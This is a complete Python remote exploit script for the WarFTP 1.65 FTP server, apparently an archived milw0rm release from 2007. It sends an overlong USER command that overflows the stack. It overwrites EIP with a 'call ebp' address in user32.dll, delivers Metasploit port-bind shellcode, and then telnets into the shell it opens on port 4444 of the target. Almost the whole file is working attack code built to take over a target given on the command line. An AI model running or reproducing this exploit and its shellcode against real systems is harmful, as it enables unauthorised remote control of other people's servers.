#!/usr/bin/python
# Remote exploit for WarFTP 1.65. Tested on Windows 2000 server SP4 inside
# VMware. A trivially exploitable stack overflow is present in WarFTP which
# can be triggered by sending a long username (>480 bytes) along with the USER
# ftp command. Maybe other commands like PASS might also be affected. I did
# not check though. This exploit binds shell on TCP port 4444 and then
# connects to it
#
# Author shall not bear any responsibility for any screw ups
# Winny Thomas :-)

import os
import sys
import time
import socket
import struct

# alphanumeric portbind shellcode from metasploit
shellcode  = "\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49"
shellcode += "\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36"
shellcode += "\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34"
shellcode += "\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41"
shellcode += "\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4c\x36\x4b\x4e"
shellcode += "\x4d\x34\x4a\x4e\x49\x4f\x4f\x4f\x4f\x4f\x4f\x4f\x42\x46\x4b\x58"
shellcode += "\x4e\x56\x46\x42\x46\x42\x4b\x58\x45\x54\x4e\x53\x4b\x48\x4e\x57"
shellcode += "\x45\x30\x4a\x47\x41\x30\x4f\x4e\x4b\x48\x4f\x44\x4a\x51\x4b\x38"
shellcode += "\x4f\x55\x42\x32\x41\x50\x4b\x4e\x49\x44\x4b\x58\x46\x33\x4b\x58"
shellcode += "\x41\x30\x50\x4e\x41\x43\x42\x4c\x49\x49\x4e\x4a\x46\x48\x42\x4c"
shellcode += "\x46\x37\x47\x30\x41\x4c\x4c\x4c\x4d\x30\x41\x30\x44\x4c\x4b\x4e"
shellcode += "\x46\x4f\x4b\x53\x46\x35\x46\x52\x4a\x42\x45\x57\x45\x4e\x4b\x48"
shellcode += "\x4f\x45\x46\x52\x41\x30\x4b\x4e\x48\x46\x4b\x38\x4e\x50\x4b\x54"
shellcode += "\x4b\x48\x4f\x45\x4e\x41\x41\x30\x4b\x4e\x43\x30\x4e\x32\x4b\x58"
shellcode += "\x49\x48\x4e\x36\x46\x42\x4e\x41\x41\x56\x43\x4c\x41\x53\x4b\x4d"
shellcode += "\x46\x56\x4b\x38\x43\x54\x42\x43\x4b\x58\x42\x44\x4e\x30\x4b\x38"
shellcode += "\x42\x47\x4e\x41\x4d\x4a\x4b\x58\x42\x44\x4a\x30\x50\x55\x4a\x56"
shellcode += "\x50\x48\x50\x34\x50\x30\x4e\x4e\x42\x45\x4f\x4f\x48\x4d\x48\x36"
shellcode += "\x43\x45\x48\x56\x4a\x46\x43\x53\x44\x33\x4a\x46\x47\x37\x43\x57"
shellcode += "\x44\x33\x4f\x35\x46\x35\x4f\x4f\x42\x4d\x4a\x36\x4b\x4c\x4d\x4e"
shellcode += "\x4e\x4f\x4b\x53\x42\x45\x4f\x4f\x48\x4d\x4f\x35\x49\x38\x45\x4e"
shellcode += "\x48\x46\x41\x58\x4d\x4e\x4a\x30\x44\x30\x45\x35\x4c\x36\x44\x30"
shellcode += "\x4f\x4f\x42\x4d\x4a\x46\x49\x4d\x49\x50\x45\x4f\x4d\x4a\x47\x35"
shellcode += "\x4f\x4f\x48\x4d\x43\x35\x43\x45\x43\x55\x43\x45\x43\x35\x43\x34"
shellcode += "\x43\x55\x43\x34\x43\x45\x4f\x4f\x42\x4d\x48\x46\x4a\x36\x41\x41"
shellcode += "\x4e\x45\x48\x36\x43\x45\x49\x58\x41\x4e\x45\x39\x4a\x56\x46\x4a"
shellcode += "\x4c\x31\x42\x37\x47\x4c\x47\x45\x4f\x4f\x48\x4d\x4c\x46\x42\x31"
shellcode += "\x41\x55\x45\x55\x4f\x4f\x42\x4d\x4a\x36\x46\x4a\x4d\x4a\x50\x42"
shellcode += "\x49\x4e\x47\x45\x4f\x4f\x48\x4d\x43\x55\x45\x35\x4f\x4f\x42\x4d"
shellcode += "\x4a\x36\x45\x4e\x49\x54\x48\x58\x49\x44\x47\x55\x4f\x4f\x48\x4d"
shellcode += "\x42\x55\x46\x35\x46\x35\x45\x35\x4f\x4f\x42\x4d\x43\x39\x4a\x56"
shellcode += "\x47\x4e\x49\x47\x48\x4c\x49\x37\x47\x45\x4f\x4f\x48\x4d\x45\x45"
shellcode += "\x4f\x4f\x42\x4d\x48\x46\x4c\x36\x46\x56\x48\x36\x4a\x46\x43\x46"
shellcode += "\x4d\x46\x49\x58\x45\x4e\x4c\x56\x42\x35\x49\x55\x49\x52\x4e\x4c"
shellcode += "\x49\x38\x47\x4e\x4c\x56\x46\x54\x49\x58\x44\x4e\x41\x53\x42\x4c"
shellcode += "\x43\x4f\x4c\x4a\x50\x4f\x44\x54\x4d\x52\x50\x4f\x44\x34\x4e\x32"
shellcode += "\x43\x49\x4d\x48\x4c\x47\x4a\x33\x4b\x4a\x4b\x4a\x4b\x4a\x4a\x36"
shellcode += "\x44\x47\x50\x4f\x43\x4b\x48\x41\x4f\x4f\x45\x57\x46\x34\x4f\x4f"
shellcode += "\x48\x4d\x4b\x45\x47\x55\x44\x55\x41\x45\x41\x35\x41\x55\x4c\x36"
shellcode += "\x41\x30\x41\x35\x41\x55\x45\x45\x41\x45\x4f\x4f\x42\x4d\x4a\x56"
shellcode += "\x4d\x4a\x49\x4d\x45\x30\x50\x4c\x43\x35\x4f\x4f\x48\x4d\x4c\x56"
shellcode += "\x4f\x4f\x4f\x4f\x47\x33\x4f\x4f\x42\x4d\x4b\x38\x47\x55\x4e\x4f"
shellcode += "\x43\x48\x46\x4c\x46\x36\x4f\x4f\x48\x4d\x44\x55\x4f\x4f\x42\x4d"
shellcode += "\x4a\x46\x42\x4f\x4c\x48\x46\x50\x4f\x45\x43\x55\x4f\x4f\x48\x4d"
shellcode += "\x4f\x4f\x42\x4d\x5a\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"

def ConnectRemoteShell(target):
       connect = "/usr/bin/telnet " + target + " 4444"
       os.system(connect)

def ExploitFTP(target):
       sockAddr = (target, 21)
       tsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
       tsock.connect(sockAddr)
       response = tsock.recv(1024)

       # At the time of overflow EBP points to our shellcode
       payload = "USER "
       payload += "A" * 485
       # Point of EIP overwrite. Address of 'call ebp' from user32.dll SP4.
       payload += struct.pack("<L", 0x77E14709)
       payload += "\x90" * 100
       payload += shellcode
       payload += "\r\n"
       tsock.send(payload)

if __name__ == '__main__':
       try:
               target = sys.argv[1]
       except IndexError:
               print 'Usage: %s <target>' % sys.argv[0]
               sys.exit(-1)

       ExploitFTP(target)
       time.sleep(2)
       ConnectRemoteShell(target)

# milw0rm.com [2007-03-14]
